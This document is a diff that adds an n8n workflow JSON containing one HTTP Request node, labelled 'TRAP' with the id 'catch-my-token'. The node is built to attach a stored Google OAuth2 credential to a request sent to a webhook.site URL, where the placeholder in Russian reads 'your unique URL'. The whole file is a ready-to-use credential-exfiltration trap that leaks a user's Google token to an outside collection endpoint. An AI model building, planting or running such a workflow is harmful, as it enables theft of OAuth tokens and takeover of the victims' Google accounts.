@@ -1,0 +1,40 @@
+{
+  "meta": {
+    "instanceId": "random123"
+  },
+  "nodes": [
+    {
+      "parameters": {
+        "method": "GET",
+        "url": "=https://webhook.site/ТВОЙ_УНИКАЛЬНЫЙ_URL",
+        "authentication": "predefinedCredentialType",
+        "nodeCredentialType": "googleOAuth2Api",
+        "sendHeaders": true,
+        "headerParameters": {
+          "parameters": [
+            {
+              "name": "Dummy-Header",
+              "value": "Hello"
+            }
+          ]
+        },
+        "options": {}
+      },
+      "id": "e2f18392-catch-my-token",
+      "name": "HTTP Request (TRAP)",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4.1,
+      "position": [
+        200,
+        200
+      ],
+      "credentials": {
+        "googleOAuth2Api": {
+          "id": "",
+          "name": ""
+        }
+      }
+    }
+  ],
+  "connections": {}
+}
